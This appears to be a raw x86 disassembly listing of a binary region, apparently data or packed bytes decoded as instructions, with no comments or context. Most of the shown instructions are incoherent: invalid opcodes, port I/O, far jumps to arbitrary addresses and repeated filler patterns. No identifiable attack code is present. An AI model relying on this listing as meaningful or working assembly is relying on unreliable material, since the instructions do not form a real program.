  447d31:	jg     0x447cf9
  447d33:	ret    0x7e68
  447d36:	fnsave [edx-0x1c2c8fa4]
  447d3c:	dec    sp
  447d3e:	test   eax,0xd3455dea
  447d43:	jecxz  0x447dbe
  447d45:	inc    edi
  447d46:	iret   
  447d47:	cld    
  447d48:	dec    ebp
  447d49:	pop    ds
  447d4a:	aam    0xad
  447d4c:	dec    eax
  447d4d:	sub    eax,0x1629add9
  447d52:	std    
  447d53:	ret    
  447d54:	add    esp,DWORD PTR [esp+edx*8+0x641cfb9]
  447d5b:	mov    dh,0xd2
  447d5d:	or     bh,bh
  447d5f:	ret    
  447d60:	add    ebp,DWORD PTR [edx-0x2a]
  447d63:	call   0x26e7:0xc116f9e0
  447d6a:	or     DWORD PTR [edi-0x7b1af814],esi
  447d70:	aad    0x75
  447d72:	outs   dx,DWORD PTR ds:[esi]
  447d73:	in     al,dx
  447d74:	jmp    DWORD PTR [esi+eiz*8]
  447d77:	xchg   ebx,eax
  447d78:	shl    esi,cl
  447d7a:	in     al,0x9b
  447d7c:	loopne 0x447d7e
  447d7e:	ret    
  447d7f:	in     al,0x86
  447d81:	mov    dh,0xc9
  447d83:	jmp    0x447d15
  447d85:	jmp    0x42c9636
  447d8a:	repnz aam 0x8c
  447d8d:	jmp    0xe0927657
  447d92:	shl    esp,0x3b
  447d95:	mov    edi,0xd444fab5
  447d9a:	mov    ecx,0x5fea3700
  447d9f:	add    BYTE PTR [eax+edx*8-0x4a],cl
  447da3:	jmp    0x447d8c
  447da5:	add    esi,DWORD PTR [edx+0x79df1ad4]
  447dab:	add    al,0x36
  447dad:	in     al,dx
  447dae:	cmp    bh,0x3
  447db1:	call   0xdc61734c
  447db6:	xor    ah,0x17
  447db9:	sar    BYTE PTR [edx-0x2],1
  447dbc:	cmc    
  447dbd:	ror    DWORD PTR [edx-0x3],0xf3
  447dc1:	ficom  WORD PTR [ebx-0x27]
  447dc4:	pop    ds
  447dc5:	add    esi,DWORD PTR ds:0xbef100f4
  447dcb:	or     eax,0xf6faf571
  447dd0:	pop    edi
  447dd1:	xlat   BYTE PTR ds:[ebx]
  447dd2:	xchg   ebp,eax
  447dd3:	cli    
  447dd4:	pop    ebx
  447dd5:	fist   DWORD PTR [esi-0x27]
  447dd8:	add    cl,ch
  447dda:	popa   
  447ddb:	fld    DWORD PTR [eax]
  447ddd:	jmp    0xe9455743
  447de2:	add    BYTE PTR [ecx-0x27],ah
  447de5:	add    cl,ch
  447de7:	popa   
  447de8:	fld    DWORD PTR [eax]
  447dea:	jmp    0xe9455750
  447def:	popa   
  447df0:	fld    DWORD PTR [eax]
  447df2:	jmp    0xe9455758
  447df7:	popa   
  447df8:	fld    DWORD PTR [eax]
  447dfa:	jmp    0xe9455760
  447dff:	popa   
  447e00:	fld    DWORD PTR [eax]
  447e02:	jmp    0xe9455768
  447e07:	popa   
  447e08:	fld    DWORD PTR [eax]
  447e0a:	jmp    0xe9455770
  447e0f:	popa   
  447e10:	fld    DWORD PTR [eax]
  447e12:	jmp    0xe9455778
  447e17:	popa   
  447e18:	fld    DWORD PTR [eax]
  447e1a:	jmp    0xe9455780
  447e1f:	popa   
  447e20:	fld    DWORD PTR [eax]
  447e22:	jmp    0xe9455788
  447e27:	popa   
  447e28:	fld    DWORD PTR [eax]
  447e2a:	jmp    0xe9455790
  447e2f:	popa   
  447e30:	fld    DWORD PTR [eax]
  447e32:	jmp    0xe9455798
  447e37:	popa   
  447e38:	fld    DWORD PTR [eax]
  447e3a:	jmp    0xe94557a0
  447e3f:	popa   
  447e40:	fld    DWORD PTR [eax]
  447e42:	add    bl,cl
  447e44:	fld    DWORD PTR [eax]
  447e46:	add    BYTE PTR [eax],al
  447e48:	mov    ebx,0xbb0000d9
  447e4d:	fld    DWORD PTR [eax]
  447e4f:	add    bl,cl
  447e51:	fld    DWORD PTR [eax]
  447e53:	add    bl,cl
  447e55:	fld    DWORD PTR [eax]
  447e57:	add    BYTE PTR [ebx-0x44ffff27],bh
  447e5d:	fld    DWORD PTR [eax]
  447e5f:	add    BYTE PTR [ebx-0x74ffff27],cl
  447e65:	fld    DWORD PTR [eax]
  447e67:	add    BYTE PTR [ebx-0x27],bh
  447e6a:	add    BYTE PTR [eax],al
  447e6c:	jnp    0x447e47
  447e6e:	add    BYTE PTR [eax],al
  447e70:	mov    ebx,ecx
  447e72:	add    BYTE PTR [eax],al
  447e74:	mov    ebx,ecx
  447e76:	add    BYTE PTR [eax],al
  447e78:	jnp    0x447e53
  447e7a:	add    BYTE PTR [eax],al
  447e7c:	mov    ds:0x9300362d,eax
  447e81:	xchg   esi,eax
  447e82:	add    BYTE PTR ss:[edx-0x28],cl
  447e86:	add    BYTE PTR [eax],al
  447e88:	sub    eax,0x3c0000d8
  447e8d:	fld    DWORD PTR [eax]
  447e8f:	add    BYTE PTR [ebx-0x54ffc960],ah
  447e95:	cwde   
  447e96:	add    BYTE PTR ss:[ebx],bh
  447e99:	fld    DWORD PTR [eax]
  447e9b:	add    BYTE PTR ds:0x3c0000d9,ch
  447ea1:	fld    DWORD PTR [eax]
  447ea3:	add    BYTE PTR [ebx],cl
  447ea5:	fld    DWORD PTR [eax]
  447ea7:	add    bl,al
  447ea9:	cwde   
  447eaa:	add    BYTE PTR ss:[eax],al
  447ead:	sti    
  447eae:	fadd   DWORD PTR [eax]
  447eb0:	add    BYTE PTR [eax],bl
  447eb2:	fld    DWORD PTR [eax]
  447eb4:	add    BYTE PTR [ecx+ebx*8],al
  447eb7:	add    BYTE PTR [eax],al
  447eb9:	sti    
  447eba:	fadd   DWORD PTR [eax]
  447ebc:	add    BYTE PTR [edx-0x7f],ah
  447ebf:	add    al,BYTE PTR [eax]
  447ec1:	(bad)  
  447ec2:	int3   
  447ec3:	push   esi
  447ec4:	inc    eax
  447ec5:	sbb    DWORD PTR [edx-0x7dd9490d],esi
  447ecb:	add    al,BYTE PTR [eax]
  447ecd:	bound  esp,QWORD PTR [edx-0x7da46cff]
  447ed3:	add    al,BYTE PTR [eax]
  447ed5:	bound  eax,QWORD PTR [edx-0x7d9dfffe]
  447edb:	add    al,BYTE PTR [eax]
  447edd:	bound  eax,QWORD PTR [edx-0x7e62000a]
  447ee3:	dec    esi
  447ee4:	not    DWORD PTR [ebp+0x6200026d]
  447eea:	add    al,BYTE PTR [bx+si]
  447eed:	bound  eax,QWORD PTR [edx+0x2]
  447ef0:	add    BYTE PTR [edx-0x45],ah
  447ef3:	add    DWORD PTR [eax],eax
  447ef5:	bound  eax,QWORD PTR [edx]
  447ef7:	std    
  447ef8:	jmp    DWORD PTR [edx+0x1]
  447efb:	dec    esi
  447efc:	mul    DWORD PTR [ebp+0x6a]
  447eff:	add    al,BYTE PTR [eax]
  447f01:	bound  edi,QWORD PTR [edx+0x2]
  447f04:	add    BYTE PTR [edx-0x5e],ah
  447f07:	add    al,BYTE PTR [eax]
  447f09:	(bad)  
  447f0a:	jmp    0x447f0d
  447f0c:	add    BYTE PTR [edx-0x7e],ah
  447f0f:	add    al,BYTE PTR [eax]
  447f11:	add    BYTE PTR [edx-0x7e],ah
  447f14:	add    al,BYTE PTR [eax]
  447f16:	bound  eax,QWORD PTR [edx-0x7d5dfd5e]
  447f1c:	add    al,BYTE PTR [eax]
  447f1e:	bound  eax,QWORD PTR [edx-0x7d9dfffe]
  447f24:	dec    edx
  447f25:	std    
  447f26:	push   ebp
  447f27:	add    BYTE PTR [edx],0x0
  447f2a:	bound  eax,QWORD PTR [edx-0x7d9dfffe]
  447f30:	pop    eax
  447f31:	or     BYTE PTR [edx+0x62000282],ah
  447f37:	(bad)  
  447f39:	add    esp,DWORD PTR [edx-0x27]
  447f3c:	daa    
  447f3d:	js     0x447f9d
  447f3f:	sbb    eax,ebp
  447f41:	add    esp,DWORD PTR [edx-0x27]
  447f44:	out    0x3,eax
  447f46:	(bad)  
  447f47:	fst    DWORD PTR [edi]
  447f49:	inc    ebx
  447f4a:	gs sbb eax,ebp
  447f4d:	add    esp,DWORD PTR [edx-0x27]
  447f50:	out    0x3,eax
  447f52:	(bad)  
  447f53:	fnstcw WORD PTR [ebx-0x17e6afb1]
  447f59:	add    esp,DWORD PTR [edx-0x27]
  447f5c:	out    0x3,eax
  447f5e:	bound  ebx,QWORD PTR [ecx+0x76]
  447f61:	jnp    0x447fcf
  447f63:	sbb    eax,ebp
  447f65:	add    esp,DWORD PTR [edx-0x27]
  447f68:	out    0x3,eax
  447f6a:	bound  edi,QWORD PTR [ecx+0x196b9573]
  447f70:	call   0xe81de178
  447f75:	inc    DWORD PTR [eax]
  447f77:	lods   al,BYTE PTR ds:[esi]
  447f78:	mov    eax,ds:0x193e8603
  447f7d:	call   0xfd7ee185
  447f82:	inc    esi
  447f83:	and    al,0xcf
  447f85:	sub    DWORD PTR [edx],esi
  447f87:	pushf  
  447f88:	sbb    eax,ecx
  447f8a:	push   ebx
  447f8b:	hlt    
  447f8c:	and    al,0x78
  447f8e:	sub    bh,dl
  447f90:	cmp    al,0x25
  447f92:	js     0x447f5f
  447f94:	sbb    DWORD PTR [eax],ebx
  447f96:	mov    eax,0xfac4b52e
  447f9b:	out    0x1a,eax
  447f9d:	add    DWORD PTR [ecx-0x1f],ebp
  447fa0:	sbb    DWORD PTR [ecx+0x6e],ebx
  447fa3:	sub    eax,0x17062b45
  447fa8:	pop    esi
  447fa9:	adc    DWORD PTR [ebp-0x6a3ee60c],esp
  447faf:	ret    0x115
  447fb2:	(bad)
  447fb6:	push   0x664130e0
  447fbb:	dec    edx
  447fbc:	pushf  
  447fbd:	lahf   
  447fbe:	scas   al,BYTE PTR es:[edi]
  447fbf:	(bad)  
  447fc0:	and    BYTE PTR [esi],dl
  447fc2:	adc    DWORD PTR [eax],esp
  447fc4:	xchg   BYTE PTR [ecx-0x2],al
  447fc7:	xchg   edi,eax
  447fc8:	jns    0x447f4f
  447fca:	nop
  447fcb:	out    0xa0,al
  447fcd:	ds inc ebx
  447fcf:	push   ebx
  447fd0:	inc    ecx
  447fd1:	inc    eax
  447fd2:	xor    eax,0xc64bfe3d
  447fd7:	pop    eax
  447fd8:	push   esp
  447fd9:	out    dx,al
  447fda:	fld    DWORD PTR [eax]
  447fdc:	inc    ecx
  447fdd:	in     eax,0x42
  447fdf:	popf   
  447fe0:	ins    DWORD PTR es:[edi],dx
  447fe1:	push   ebx
  447fe2:	xlat   BYTE PTR ds:[ebx]
  447fe3:	push   eax
  447fe4:	adc    eax,0xcbcfea6e
  447fe9:	or     BYTE PTR [edx-0x78],al
  447fec:	sub    al,0xfb
  447fee:	loope  0x44801d
  447ff0:	xor    al,al
  447ff2:	and    eax,0x3ccbe16d
  447ff7:	add    DWORD PTR [esi-0x25],ebp
  447ffa:	stos   BYTE PTR es:[edi],al
  447ffb:	and    esp,eax
  447ffd:	leave  
  447ffe:	loope  0x448024
  448000:	and    ch,BYTE PTR [edi+0x3d]
  448003:	add    bh,bh
  448005:	pushf  
  448006:	repnz push ss
  448008:	retf   
  448009:	js     0x448056
  44800b:	cmp    DWORD PTR [edx+edx*4+0x2a9d843c],0xffffff90
  448013:	out    0xdf,eax
  448015:	xor    ah,BYTE PTR [ecx+0x3f36c2d0]
  44801b:	hlt    
  44801c:	or     al,0xdb
  44801e:	add    al,0x54
  448020:	loope  0x44800c
  448022:	imul   ebx,DWORD PTR [edi-0x57],0x21
  448026:	inc    esp
  448027:	xor    DWORD PTR [eax],esp
  448029:	mov    ds,WORD PTR [esi+0x39cfa800]
  44802f:	xor    eax,0x53dc47e3
  448034:	inc    esi
  448035:	dec    esp
  448036:	aam    0x5d
  448038:	push   es
  448039:	stos   DWORD PTR es:[edi],eax
  44803a:	dec    ebx
  44803b:	cmp    esi,DWORD PTR [eax-0x1c]
  44803e:	xchg   edx,eax
  44803f:	pop    edx
  448040:	add    ah,al
  448042:	and    dl,BYTE PTR [eax+esi*8+0x54c0b62a]
  448049:	push   ds
  44804a:	push   edx
  44804b:	es popa 
  44804d:	jmp    0x13ae:0x505a8a02
  448054:	pop    ebp
  448055:	inc    edx
  448056:	pminub mm4,QWORD PTR [edi+0x21]
  44805a:	sti    
  44805b:	clc    
  44805c:	repz pop esp
  44805e:	inc    esp
  44805f:	mov    ds:0x80a2e6c8,eax
  448064:	outs   dx,BYTE PTR ds:[esi]
  448065:	(bad)  
  448066:	push   ds
  448067:	call   0x9b52:0x35f6b97
  44806e:	test   eax,0xd57b7513
  448073:	add    BYTE PTR [eax],al
  448075:	inc    esi
  448076:	adc    bh,BYTE PTR [esp+ecx*8-0x3342eda9]
  44807d:	aaa    
  44807e:	adc    bh,dl
  448080:	aas    
  448081:	retf   0xac2
  448084:	xlat   BYTE PTR ds:[ebx]
  448085:	test   al,0x8c
  448087:	sub    eax,0xf9398c0a
  44808c:	aas    
  44808d:	add    DWORD PTR [ecx+0x5ff4df3b],ecx
  448093:	xchg   BYTE PTR [esi+0x19],ch
  448096:	pop    edx
  448097:	in     al,0x3f
  448099:	mov    BYTE PTR [ecx-0x9d9ae4],ch
  44809f:	pop    eax
  4480a0:	pop    ss
  4480a1:	int3   
  4480a2:	scas   al,BYTE PTR es:[edi]
  4480a3:	out    dx,eax
  4480a4:	aas    
  4480a5:	add    BYTE PTR [edx+0x22],ah
  4480a8:	add    ah,BYTE PTR [ebx]
  4480aa:	fidivr WORD PTR [edi+0x35be3ee5]
  4480b0:	stos   BYTE PTR es:[edi],al
  4480b1:	out    0x45,al
  4480b3:	mov    dl,0xaa
  4480b5:	scas   al,BYTE PTR es:[edi]
  4480b6:	mov    ebx,DWORD PTR [esi]
  4480b8:	mov    ds:0x886fb6fd,al
  4480bd:	jmp    0x4480ec
  4480bf:	adc    DWORD PTR [ecx],0xffffffb4
  4480c2:	mov    al,ds:0xf6cd67bc
  4480c7:	(bad)  
  4480c9:	fist   WORD PTR [ebp-0x630aafcc]
  4480cf:	ror    DWORD PTR [eax-0x69c9b2ef],1
  4480d5:	fdivr  QWORD PTR [ebp-0x61]
  4480d8:	mov    dh,0x5a
  4480da:	ret    
  4480db:	lds    ecx,FWORD PTR [eax-0x4a]
  4480de:	(bad)  
  4480df:	in     eax,0x6a
  4480e1:	leave  
  4480e2:	gs in  al,0x48
  4480e5:	push   ebx
  4480e6:	pop    ecx
  4480e7:	test   DWORD PTR [esi+0x67586ec4],edi
  4480ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4480ee:	dec    ebp
  4480ef:	shr    cl,0xb9
  4480f2:	out    dx,al
  4480f3:	fld    st(7)
  4480f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4480f6:	pop    esp
  4480f7:	loope  0x44813a
  4480f9:	mov    WORD PTR ds:0x80be1dde,?
  4480ff:	inc    BYTE PTR [esi+0x7751333b]
  448105:	jp     0x4480a4
  448107:	push   ecx
  448108:	mov    ecx,0x58230058
  44810d:	lea    edx,[ebx-0x32]
  448110:	test   BYTE PTR [edi+0x62cf8557],al
  448116:	daa    
  448117:	out    dx,eax
  448118:	ja     0x4480aa
  44811a:	xchg   edx,eax
  44811b:	fisttp WORD PTR [edi+eax*2+0x3d96d3c]
  448122:	adc    eax,edi
  448124:	jno    0x448147
  448126:	test   eax,0x9c4f737d
  44812b:	dec    eax
  44812c:	test   al,0x44
  44812e:	mov    al,ds:0xe77c7cc3
  448133:	xchg   ecx,eax
  448134:	pop    ds
  448135:	cwde   
  448136:	xor    BYTE PTR [edi-0x830b559],ch
  44813c:	xchg   ebx,eax
  44813d:	or     edi,DWORD PTR [eax+0x749f5c7c]
  448143:	jecxz  0x4480ea
  448145:	js     0x448194
  448147:	cwde   
  448148:	ret    0xe711
  44814b:	jbe    0x448169
  44814d:	fld    DWORD PTR [ebx+0x6]
  448150:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  448151:	enter  0xb37c,0xa0
  448155:	imul   ecx,edx,0x50e820ec
  44815b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44815c:	mov    ds:0xd10a7b83,eax
  448161:	add    dl,BYTE PTR [ebp-0x56a18446]
  448167:	popa   
  448168:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448169:	and    eax,0xdf1b5787
  44816e:	cdq    
  44816f:	add    bl,ch
  448171:	in     eax,dx
  448172:	imul   BYTE PTR [esi]
  448174:	cmp    al,0xa3
  448176:	cli    
  448177:	aam    0x51
  448179:	mov    ecx,DWORD PTR [ebx]
  44817b:	das    
  44817c:	xor    BYTE PTR [edi-0x5f],dh
  44817f:	jae    0x448189
  448181:	mov    ds:0x98ac8a45,al
  448186:	scas   eax,DWORD PTR es:[edi]
  448187:	sub    eax,0xa5465bff
  44818c:	pop    es
  44818d:	lods   al,BYTE PTR ds:[esi]
  44818e:	or     ebx,ebx
  448190:	adc    ecx,ecx
  448192:	inc    esi
  448193:	mov    ch,0xec
  448195:	sbb    eax,0xb5529aa1
  44819a:	add    ah,cl
  44819c:	test   BYTE PTR [edx+0x1e55b724],0x52
  4481a3:	xchg   edi,eax
  4481a4:	mov    al,ds:0xc96e1bf2
  4481a9:	bound  esp,QWORD PTR [edx+0x749b50a9]
  4481af:	shr    BYTE PTR [esi+0x7b671727],cl
  4481b5:	push   ecx
  4481b6:	pop    ebx
  4481b7:	push   ss
  4481b8:	jno    0x448167
  4481ba:	mov    ch,0x19
  4481bc:	fistp  QWORD PTR [ebx+0x5af1f18]
  4481c2:	arpl   WORD PTR [edi+ebx*8+0x55e7a65e],sp
  4481c9:	in     al,dx
  4481ca:	jge    0x9fdb1145
  4481d0:	xchg   esp,eax
  4481d1:	xchg   ecx,eax
  4481d2:	std    
  4481d3:	mov    ds:0xb81f800,eax
  4481d8:	jmp    0xea455b3e
  4481dd:	sub    bl,BYTE PTR [ecx]
  4481df:	add    DWORD PTR [edi+0x18],ebp
  4481e2:	sbb    DWORD PTR [ecx],eax
  4481e4:	jmp    0x8a455b4a
  4481e9:	nop
  4481ea:	sbb    DWORD PTR [ecx],eax
  4481ec:	jmp    0xe9455b52
  4481f1:	popa   
  4481f2:	fld    DWORD PTR [eax]
  4481f4:	jmp    0x3b455b5a
  4481f9:	jo     0x448214
  4481fb:	add    ecx,ebp
  4481fd:	popa   
  4481fe:	fld    DWORD PTR [eax]
  448200:	jmp    0xe9455b66
  448205:	popa   
  448206:	fld    DWORD PTR [eax]
  448208:	stc    
  448209:	push   edx
  44820a:	sbb    DWORD PTR [ecx],eax
  44820c:	jmp    0xe9455b72
  448211:	popa   
  448212:	fld    DWORD PTR [eax]
  448214:	add    BYTE PTR [ebx],bh
  448216:	fiadd  DWORD PTR [eax]
  448218:	add    ch,dl
  44821a:	push   0xda4b0041
  44821f:	add    BYTE PTR [eax],al
  448221:	cmp    ebx,edx
  448223:	add    BYTE PTR [eax],al
  448225:	cmp    ebx,edx
  448227:	add    BYTE PTR [eax],al
  448229:	lahf   
  44822a:	imul   eax,DWORD PTR [ecx+0x0],0xda0b
  448231:	sti    
  448232:	fld    DWORD PTR [eax]
  448234:	add    bl,bh
  448236:	fld    DWORD PTR [eax]
  448238:	add    BYTE PTR [eax],al
  44823a:	sub    DWORD PTR [ecx+0x41],ebp
  44823d:	add    BYTE PTR [ebx],cl
  44823f:	fiadd  DWORD PTR [eax]
  448241:	add    bl,bh
  448243:	fld    DWORD PTR [eax]
  448245:	add    bl,bh
  448247:	fld    DWORD PTR [eax]
  448249:	add    BYTE PTR [ebx-0x34ffc047],dh
  44824f:	fld    DWORD PTR [eax]
  448251:	add    BYTE PTR [ebx-0x44ffff27],bh
  448257:	fld    DWORD PTR [eax]
  448259:	add    BYTE PTR [edx-0x34ffc047],bh
  44825f:	fld    DWORD PTR [eax]
  448261:	add    BYTE PTR [ebx-0x44ffff27],bh
  448267:	fld    DWORD PTR [eax]
  448269:	add    cl,al
  44826b:	mov    ecx,0xd98b003f
  448270:	add    BYTE PTR [eax],al
  448272:	jnp    0x44824d
  448274:	add    BYTE PTR [eax],al
  448276:	jnp    0x448251
  448278:	add    BYTE PTR [eax],al
  44827a:	mov    edi,DWORD PTR [edx-0x2674ffc1]
  448280:	add    BYTE PTR [eax],al
  448282:	jnp    0x44825d
  448284:	add    BYTE PTR [eax],al
  448286:	jnp    0x448261
  448288:	add    BYTE PTR [eax],al
  44828a:	add    eax,0x62003fb8
  44828f:	jb     0x448293
  448291:	add    BYTE PTR [edx+0x72],ah
  448294:	add    al,BYTE PTR [eax]
  448296:	bound  esi,QWORD PTR [edx+0x2]
  448299:	add    BYTE PTR [edx-0xd],ah
  44829c:	and    al,BYTE PTR [ecx+0x0]
  44829f:	bound  esi,QWORD PTR [edx+0x2]
  4482a2:	add    BYTE PTR [edx+0x72],ah
  4482a5:	add    al,BYTE PTR [eax]
  4482a7:	bound  esi,QWORD PTR [edx+0x2]
  4482aa:	add    BYTE PTR [edx+0x5f],ah
  4482ad:	and    BYTE PTR [ecx+0x62],al
  4482b0:	jb     0x4482b4
  4482b2:	add    BYTE PTR [edx+0x72],ah
  4482b5:	add    al,BYTE PTR [eax]
  4482b7:	bound  esi,QWORD PTR [edx+0x2]
  4482ba:	add    BYTE PTR [edx+0x12],ah
  4482bd:	and    eax,DWORD PTR [ecx+0x62]
  4482c0:	jb     0x4482c4
  4482c2:	add    BYTE PTR [edx+0x72],ah
  4482c5:	add    al,BYTE PTR [eax]
  4482c7:	bound  esi,QWORD PTR [edx+0x2]
  4482ca:	add    BYTE PTR [edx+0x15],ah
  4482cd:	and    eax,DWORD PTR [ecx+0x62]
  4482d0:	jb     0x4482d4
  4482d2:	add    BYTE PTR [edx+0x72],ah
  4482d5:	add    al,BYTE PTR [eax]
  4482d7:	bound  esi,QWORD PTR [edx+0x2]
  4482da:	add    BYTE PTR [edx-0x1d],ah
  4482dd:	and    al,BYTE PTR [ecx+0x62]
  4482e0:	jb     0x4482e4
  4482e2:	add    BYTE PTR [edx+0x72],ah
  4482e5:	add    al,BYTE PTR [eax]
  4482e7:	bound  esi,QWORD PTR [edx+0x2]
  4482ea:	add    BYTE PTR [edx+0x55],ah
  4482ed:	icebp  
  4482ee:	inc    ecx
  4482ef:	bound  esi,QWORD PTR [edx+0x2]
  4482f2:	add    BYTE PTR [edx+0x72],ah
  4482f5:	add    al,BYTE PTR [eax]
  4482f7:	bound  esi,QWORD PTR [edx+0x2]
  4482fa:	add    BYTE PTR [edx-0x31],ah
  4482fd:	out    dx,eax
  4482fe:	inc    ecx
  4482ff:	bound  esi,QWORD PTR [edx+0x2]
  448302:	add    BYTE PTR [eax],al
  448304:	bound  esi,QWORD PTR [edx+0x2]
  448307:	add    BYTE PTR [edx-0x27],ah
  44830a:	out    0x3,eax
  44830c:	(bad)  
  44830d:	(bad)  [edx-0x18265c10]
  448313:	add    esp,DWORD PTR [edx-0x27]
  448316:	out    0x3,eax
  448318:	(bad)  
  448319:	(bad)  
  44831b:	add    esp,DWORD PTR [edx-0x27]
  44831e:	xor    eax,0xe7d9a3f1
  448323:	add    esp,DWORD PTR [edx-0x27]
  448326:	out    0x3,eax
  448328:	(bad)  
  448329:	(bad)  
  44832b:	add    esp,DWORD PTR [edx-0x27]
  44832e:	aam    0xf0
  448330:	mov    ds:0x6203e7d9,eax
  448335:	(bad)  
  448337:	add    esp,DWORD PTR [edx-0x27]
  44833a:	out    0x3,eax
  44833c:	(bad)  
  44833d:	fpatan 
  44833f:	in     eax,dx
  448340:	mov    ds:0x6203e7d9,eax
  448345:	(bad)  
  448347:	add    esp,DWORD PTR [edx-0x27]
  44834a:	out    0x3,eax
  44834c:	(bad)  
  44834d:	fst    DWORD PTR [ebx]
  44834f:	out    dx,al
  448350:	and    ebx,ecx
  448352:	out    0x3,eax
  448354:	(bad)  
  448355:	(bad)  
  448357:	add    esp,DWORD PTR [edx-0x27]
  44835a:	out    0x3,eax
  44835c:	(bad)  
  44835d:	(bad)  
  44835f:	out    dx,al
  448360:	and    ebx,ecx
  448362:	out    0x3,eax
  448364:	(bad)  
  448365:	(bad)  
  448367:	add    eax,DWORD PTR [eax]
  448369:	(bad)  
  44836a:	(bad)  
  44836c:	add    esp,DWORD PTR [edx-0x27]
  44836f:	and    eax,0xe7d9201e
  448374:	add    esp,DWORD PTR [edx-0x27]
  448377:	out    0x3,eax
  448379:	(bad)  
  44837a:	(bad)  
  44837c:	add    esp,DWORD PTR [edx-0x27]
  44837f:	out    0x13,eax
  448381:	and    cl,bl
  448383:	add    cl,ch
  448385:	popa   
  448386:	fld    DWORD PTR [eax]
  448388:	jmp    0xe9455cee
  44838d:	popa   
  44838e:	fld    DWORD PTR [eax]
  448390:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448391:	jno    0x4483aa
  448393:	add    ecx,ebp
  448395:	popa   
  448396:	fld    DWORD PTR [eax]
  448398:	jmp    0xe9455cfe
  44839d:	popa   
  44839e:	fld    DWORD PTR [eax]
  4483a0:	imul   edx,DWORD PTR [ecx+0x17],0x1
  4483a4:	jmp    0xe9455d0a
  4483a9:	popa   
  4483aa:	fld    DWORD PTR [eax]
  4483ac:	jmp    0xcb455d12
  4483b1:	outs   dx,BYTE PTR ds:[esi]
  4483b2:	pop    ss
  4483b3:	add    ecx,ebp
  4483b5:	popa   
  4483b6:	fld    DWORD PTR [eax]
  4483b8:	jmp    0xe9455d1e
  4483bd:	popa   
  4483be:	fld    DWORD PTR [eax]
  4483c0:	sqrtps xmm2,XMMWORD PTR [edi]
  4483c3:	add    ecx,ebp
  4483c5:	popa   
  4483c6:	fld    DWORD PTR [eax]
  4483c8:	jmp    0xe9455d2e
  4483cd:	add    BYTE PTR [ecx-0x27],ah
  4483d0:	add    BYTE PTR [ecx-0x16fee88f],dh
  4483d6:	popa   
  4483d7:	fld    DWORD PTR [eax]
  4483d9:	jmp    0xe9455d3f
  4483de:	popa   
  4483df:	fld    DWORD PTR [eax]
  4483e1:	js     0x448434
  4483e3:	pop    ss
  4483e4:	add    ecx,ebp
  4483e6:	popa   
  4483e7:	fld    DWORD PTR [eax]
  4483e9:	jmp    0xe9455d4f
  4483ee:	popa   
  4483ef:	fld    DWORD PTR [eax]
  4483f1:	add    esi,DWORD PTR [eax+0x17]
  4483f4:	add    ecx,ebp
  4483f6:	popa   
  4483f7:	fld    DWORD PTR [eax]
  4483f9:	jmp    0x455d5f
  4483fe:	mov    edx,esi
  448400:	add    BYTE PTR [eax],al
  448402:	mov    ebp,0x7b0042c8
  448407:	(bad)  
  448408:	add    BYTE PTR [eax],al
  44840a:	jnp    0x4483e2
  44840c:	add    BYTE PTR [eax],al
  44840e:	dec    ebx
  44840f:	(bad)  
  448410:	add    BYTE PTR [eax],al
  448412:	and    BYTE PTR [ebx-0x29c4ffbe],0x0
  448419:	add    BYTE PTR [ebx],bh
  44841b:	(bad)  
  44841c:	add    BYTE PTR [eax],al
  44841e:	dec    ebx
  44841f:	(bad)  
  448420:	add    BYTE PTR [eax],al
  448422:	fisub  WORD PTR [ebp-0x29c4ffbe]
  448428:	add    BYTE PTR [eax],al
  44842a:	cmp    edx,esi
  44842c:	add    BYTE PTR [eax],al
  44842e:	or     edx,esi
  448430:	add    BYTE PTR [eax],al
  448432:	add    ah,cl
  448434:	inc    edx
  448435:	inc    ebx
  448436:	add    bl,bh
  448438:	aad    0x0
  44843a:	add    bl,bh
  44843c:	aad    0x0
  44843e:	add    BYTE PTR [ebx+0x3b],bh
  448441:	inc    ecx
  448442:	add    bh,cl
  448444:	repnz inc eax
  448446:	add    BYTE PTR [ebx+0x3b],dh
  448449:	inc    ecx
  44844a:	add    bh,al
  44844c:	repnz inc eax
  44844e:	add    BYTE PTR [ebx],cl
  448450:	cmp    eax,DWORD PTR [ecx+0x0]
  448453:	(bad)  
  448454:	cmp    al,BYTE PTR [ecx+0x0]
  448457:	pop    es
  448458:	cmp    eax,DWORD PTR [ecx+0x0]
  44845b:	(bad)  
  44845d:	inc    ecx
  44845e:	add    BYTE PTR [edi],al
  448460:	cmp    eax,DWORD PTR [ecx+0x0]
  448463:	fistp  QWORD PTR [edx]
  448465:	inc    ecx
  448466:	add    bh,ah
  448468:	cmp    al,BYTE PTR [ecx+0x0]
  44846b:	das    
  44846c:	cmp    eax,DWORD PTR [ecx+0x0]
  44846f:	pop    es
  448470:	cmp    eax,DWORD PTR [ecx+0x0]
  448473:	xchg   ebx,eax
  448474:	cmp    eax,DWORD PTR [ecx+0x0]
  448477:	bound  esp,QWORD PTR [esp+ebx*4+0x40]
  44847b:	bound  esi,QWORD PTR [esp+ebx*4+0x40]
  44847f:	(bad)  
  448480:	aam    0x9e
  448482:	inc    eax
  448483:	(bad)  
  448484:	aam    0x9e
  448486:	inc    eax
  448487:	bound  ebp,QWORD PTR [eax-0x64]
  44848a:	inc    eax
  44848b:	bound  edi,QWORD PTR [esp+ebx*4]
  44848e:	inc    eax
  44848f:	bound  esp,QWORD PTR [esi]
  448491:	pushf  
  448492:	inc    eax
  448493:	bound  ebx,QWORD PTR [edx+0x6200409c]
  448499:	push   edx
  44849a:	pushf  
  44849b:	inc    eax
  44849c:	(bad)  
  44849d:	ficomp WORD PTR [ebx-0x63a59dc0]
  4484a3:	inc    eax
  4484a4:	(bad)  
  4484a6:	fwait
  4484a7:	inc    eax
  4484a8:	bound  edi,QWORD PTR [edx+0x72624066]
  4484ae:	add    al,BYTE PTR [eax]
  4484b0:	bound  esi,QWORD PTR [edx+0x2]
  4484b3:	add    BYTE PTR [edx+0x1f],ah
  4484b6:	lea    ecx,[eax]
  4484b8:	jmp    0x448460
  4484ba:	pushf  
  4484bb:	inc    eax
  4484bc:	bound  edx,QWORD PTR [edx]
  4484be:	popf   
  4484bf:	inc    eax
  4484c0:	bound  ecx,QWORD PTR [esi]
  4484c2:	popf   
  4484c3:	inc    eax
